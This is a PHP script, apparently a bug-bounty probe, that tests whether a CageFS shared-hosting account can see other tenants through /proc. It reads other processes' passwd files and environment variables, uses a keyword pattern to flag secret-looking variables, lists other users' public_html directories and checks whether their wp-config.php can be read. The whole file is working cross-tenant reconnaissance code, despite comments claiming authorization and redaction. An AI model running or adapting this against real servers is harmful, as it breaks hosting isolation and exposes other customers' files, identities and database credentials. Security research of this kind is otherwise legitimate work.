<?php
// bugbounty CageFS /proc cross-tenant IDENTITY probe v3 (authorized, own account).
// For each OTHER visible pid: whose cage is it (root/etc/passwd user), its identity env (USER/HOME
// only — secret-looking vars are COUNTED, never printed), and if a DIFFERENT user => list their home
// as cross-tenant proof. Never dumps credential values.
header('Content-Type: text/plain');
function u(){ return @posix_getpwuid(posix_geteuid())['name']; }
$me=u(); $mypid=getmypid();
echo "== CageFS /proc identity probe v3 ==\n";
echo "me=$me mypid=$mypid\n\n";
$pr=@scandir('/proc'); $pids=is_array($pr)?array_values(array_filter($pr,'ctype_digit')):array();
echo "pids_visible=".count($pids)."\n";
foreach($pids as $pp){
  if($pp==$mypid) continue;
  echo "\n== pid $pp ==\n";
  $cmd=@file_get_contents("/proc/$pp/cmdline"); echo "  cmd=".trim(preg_replace('/\x00/',' ',$cmd??''))."\n";
  // whose cage: read its root/etc/passwd, extract u-users
  $pw=@file_get_contents("/proc/$pp/root/etc/passwd",false,null,0,4096);
  if($pw===false){ echo "  root/etc/passwd: DENIED\n"; }
  else {
    $us=array(); foreach(explode("\n",$pw) as $l){ $n=explode(':',$l)[0]; if(preg_match('/^u\d{6,}$/',$n)) $us[]=$n; }
    $us=array_values(array_unique($us));
    $cross = $us && !in_array($me,$us);
    echo "  root/etc/passwd u-users: ".implode(",",$us)."  ".($cross?"*** DIFFERENT USER = CROSS-TENANT ***":"(mine)")."\n";
    // identity env (filter secrets)
    $env=@file_get_contents("/proc/$pp/environ");
    if($env!==false){
      $id=array(); $secret=0;
      foreach(explode("\0",$env) as $kv){ if(strpos($kv,'=')===false) continue; list($k,$v)=explode('=',$kv,2);
        if(preg_match('/USER|HOME|PWD|LOGNAME|DOCUMENT_ROOT|SERVER_NAME/i',$k)) $id[$k]=$v;
        elseif(preg_match('/PASS|SECRET|KEY|TOKEN|DB_|MYSQL|AUTH/i',$k)) $secret++;
      }
      echo "  environ identity: ".json_encode($id)."  secret_vars_present=$secret (values NOT shown)\n";
    } else echo "  environ: DENIED\n";
    // cross-tenant proof: list their home + wp-config readability
    if($cross){ foreach($us as $ou){
        $hp="/proc/$pp/root/home/$ou/public_html"; $ls=@scandir($hp);
        echo "  /home/$ou/public_html via their cage: ".($ls===false?"DENIED":("*** LISTED ".count($ls)." items: ".implode(",",array_slice(array_filter($ls,fn($x)=>$x!=='.'&&$x!=='..'),0,8))." ***"))."\n";
        $wp=@file_get_contents("$hp/wp-config.php",false,null,0,8);
        echo "    their wp-config.php: ".($wp===false?"NO":"*** READABLE (".strlen($wp)." bytes, NOT dumped) = cross-tenant secret read ***")."\n";
    }}
  }
}
echo "\n== end ==\n";
